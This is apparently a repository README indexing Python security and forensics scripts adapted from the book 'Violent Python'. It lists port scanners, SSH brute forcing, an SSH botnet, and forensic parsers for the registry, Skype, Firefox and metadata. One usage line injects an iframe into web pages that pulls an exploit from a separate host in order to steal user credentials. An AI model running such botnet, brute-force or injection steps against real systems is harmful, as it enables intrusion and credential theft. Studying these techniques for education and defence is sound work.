# Digital-Forensic-Analytics  
Forensic Investigation, Network Traffic Analysis, Penetration Testing, Antivirus Evasion, Web recon


These codes are almost similar to book: "Violent Python: A Cookbook for Hackers, Forensic Analysts, Penetration Testers and Security Engineers" book by TJ. O’Connor.  

## Operating System  
  
I Use virtualbox to setup a Ubuntu 18.04 LTS linux box to run these on  
The actual i have is Kali Linux 64 Bit 2018.2  
Window7 for few scripts  
  
Where possible i display all he codes with result Jupyter notebook (#FileFormat .ipynb)  
  
# Penetration Testing  
## PortScan.py  
### Building a port scanner
In the command Line pass the port argument as a string i.e in " " for multiple port like follow;  
taymour:∼# python portScan.py -H 10.50.60.125 -p "21, 1720"  
  
## Nmap_Port_Scanner.py
### Nmap Port Scanner
Scan the ports on the provided hosts.

## D) SSH_Botnet.py
### Building An SSH Botnet
Issue commands on ssh hosts at once provided you have the user names and passwords.

## E) sshBrute.py
### Brute Forcing SSH Passwords with Pxssh
Brute forces a host's ssh server with a provided worldlist

## H) botNet.py
### Constructing the SSH Botnet
Change IP, Root, Password to issue SSH commands on compromised machines.

## I) anonLogin.py
### 
First you have to allow /etc/vsftpd.conf file to enable anon_login to yes or uncomment it  

## L) massCompromise.py  
### Mass comprise by bridging FTP and Web
In command line following options are required to attack web pages and inject your own html file to steal compromised user credentials in default location  
Usage from terminal      
taymour# python massCompromise.py -H 192.168.95.179 -r '<iframe src="  
http://10.10.10.112:8080/exploit"></iframe>' -f userpass.txt  

# Forensic Investigations with Python
## M) discoverNetworks.py 
### Analysis of wireless aaccess points-WAP in the registry, Using Mechanize to Submit the MAC Address to Wigle
Allow to analyse connected wifi through mac adress by reading windows registry  
Usage from command prompt    
(py27) C:\Users\Taymour> python discoverNetworks.py -u <username> -p <password>  
  
## N) dumpRecycleBin.py  
### Recover deleted items in the recycle bin
Allows to discover deleted items in windows operating system ,also provide information about the user who delete files


## O) PdfRead.py
### Using PyPDF to Parse PDF Metadata
Usage#  
taymour:!# python pdfRead.py -F Violent_Python.pdf  
provide metadata and information about pdf like creation date, user, title, creator, producer etc.  


## P) exifFetch.py
### Reading Exif Metadata from Images
build a script to connect to a Website, download all the images on the site, and then check them for Exif metadata.  
#Usage in CMD   
  
python exifFetch.py -u http://www.flickr.com/photos/dvids/4999001925/sizes/o  


## Q) skype-parse.py  
### Investigating skype application artifacts
  
List out variety of contents of skype in python console about skype user history name, tags, location, text messages etc  
Usage#  
python skype-parse.py -p C:\AppData\Roaming\Microsoft\Skype_for_Desktop\skylib\taymourniazi  
  
## R) parse-firefox.py  
### Parsing Firefox Sqlite3 Databases with Python  
Display propoerties like downloads, google search, cookies  
Usage#  
taymour~# python parse-firefox.py -p !/Library/Application/Support/Firefox/Profiles/8fg7cd82.default/  

## S) printGeo.py 
### Using PyGeoIP to Correlate IP to Physical Locations
providing IP adress the script print the details like country, city name, longitude and latitude  
Usage#  
taymour# python printGeo.py  
